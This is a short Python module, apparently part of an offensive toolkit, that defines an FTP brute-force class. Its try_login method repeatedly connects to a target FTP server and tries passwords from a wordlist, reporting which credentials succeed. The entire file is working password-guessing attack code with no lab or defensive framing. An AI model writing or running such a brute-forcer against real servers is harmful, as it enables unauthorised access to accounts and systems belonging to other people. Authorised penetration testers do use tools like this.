"""FTP brute-force module."""

import ftplib
from core.bruteforce import BaseBrute


class FTPBrute(BaseBrute):
    """FTP brute-force implementation."""

    def __init__(self, target: str, port: int = 21, username: str = "anonymous",
                 wordlist: str = "wordlists/passwords.txt", threads: int = 5,
                 output_file: str = None, verbose: bool = False):
        super().__init__(target, port, username, wordlist, threads, output_file, verbose)
        self.service = "FTP"

    def try_login(self, username: str, password: str) -> bool:
        """Attempt FTP login."""
        ftp = ftplib.FTP()

        try:
            ftp.connect(self.target, self.port, timeout=5)
            ftp.login(username, password)
            ftp.quit()
            return True

        except ftplib.error_perm:
            return False

        except (ftplib.all_errors, EOFError, OSError) as e:
            if self.verbose:
                print(f"[!] FTP error for {username}:{password}: {e}")
            return False

        finally:
            try:
                ftp.quit()
            except Exception:
                pass
